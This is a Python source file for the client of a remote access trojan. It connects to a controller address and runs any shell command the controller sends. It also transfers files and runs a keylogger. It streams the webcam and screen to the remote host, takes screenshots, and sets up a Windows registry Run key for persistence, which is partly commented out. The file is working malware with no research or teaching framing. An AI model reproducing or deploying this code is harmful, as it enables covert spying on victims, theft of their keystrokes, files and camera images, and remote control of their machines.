import sys

import time
import socket
import json
import os
import threading
import cv2
import pickle
import struct
import pyautogui
import pygame
import numpy as np
import shutil
import subprocess
from subprocess import PIPE
from PIL import ImageGrab
from keylogger import KeyLogger



sc = socket.socket(socket.AF_INET, socket.SOCK_STREAM)


def receivingCommand():
    data = ''
    while True:
        try:
            data = data + sc.recv(1024).decode().rstrip()
            return json.loads(data)
        except ValueError:
            continue

def uploadFile(fileName):
    file = open(fileName, 'rb')
    sc.send(file.read())
    file.close()

def downloadFile(fileName):
    file = open(fileName, 'wb')
    sc.settimeout(1)
    _file = sc.recv(1024)
    while _file:
        file.write(_file)
        try:
            _file = sc.recv(1024)
        except socket.timeout as e:
            break
    
    sc.settimeout(None)
    file.close()

def openLog():
    sc.send(KeyLogger().readLog().encode())

def logThread():
    t = threading.Thread(target=openLog)
    t.start()

def byteStream():
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect(('192.168.0.5', 9998)) # Input Ip Address & Socket
    vid = cv2.VideoCapture(0)
    while (vid.isOpened()):
        img, frame = vid.read()
        byte = pickle.dumps(frame)
        message = struct.pack("Q", len(byte))+byte
        sock.sendall(message)

def sendByteStream():
    t = threading.Thread(target=byteStream)
    t.start()

def byteStreamScreenRecorder():
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect(('192.168.0.5', 9997)) # Input Ip Address & Socket

    screen = pygame.display.set_mode((0,0), pygame.FULLSCREEN)
    screen = screen.get_size()
    WIDTH = screen[0]/2
    HEIGHT = screen[1]

    while True:
        img = ImageGrab.grab(bbox=(0, 0, WIDTH, HEIGHT))
        capture = np.array(img)
        capture = cv2.cvtColor(capture, cv2.COLOR_BGR2RGB)
        byte = pickle.dumps(capture)
        message = struct.pack('i', len(byte))+byte
        sock.sendall(message)

def sendByteStreamScreenRecorder():
    t = threading.Thread(target=byteStreamScreenRecorder)
    t.start()

def runPersistence(registryName, fileExecutable):
    filePath = os.environ['appdata'] + '\\' + fileExecutable
    try:
        if not os.path.exists(filePath):
            shutil.copyfile(sys.executable, filePath)
            subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v ' + registryName + ' /t REG_SZ /d "' + filePath + '"', shell=True)
        else:
            pass
    except:
        pass

def runningCommand():
    while True:
        command = receivingCommand()
        if command in ('quit', 'exit'):
            break
        elif command == 'clear':
            pass
        elif command[:3] == 'cd ':
            os.chdir(command[3:])
        elif command[:8] == 'download':
            uploadFile(command[9:])
        elif command[:6] == 'upload':
            downloadFile(command[7:])
        elif command == 'start keylogger':
            KeyLogger().startLogger()
        elif command == 'read data keylogger':
            logThread()
            uploadFile('log_data.txt')
        elif command == 'stop keylogger':
            KeyLogger().stopListener()
        elif command == 'start webcam':
            sendByteStream()
        elif command == 'screenshot':
            ss = pyautogui.screenshot()
            ss.save('ss.png')
            uploadFile('ss.png')
        elif command == 'start screenrecord':
            sendByteStreamScreenRecorder()
        # elif command[:11] == 'persistence':
        #     registryName, fileExecutable = command[12:].split(' ')
        #     runPersistence(registryName, fileExecutable)

        else:
            execute = subprocess.Popen(
                command,
                shell=True,
                stdout=PIPE,
                stderr=PIPE,
                stdin=PIPE,
            )
            data = execute.stdout.read() + execute.stderr.read()
            data = data.decode()
            output = json.dumps(data)
            sc.send(output.encode())

# def exploitPersistence():
#     while True:
#         try:
#             time.sleep(100)
#             sc.connect(('192.168.0.5', 9999))
#             runningCommand()
#             sc.close()
#             break
#         except:
#             exploitPersistence()

runningCommand()

# exploitPersistence()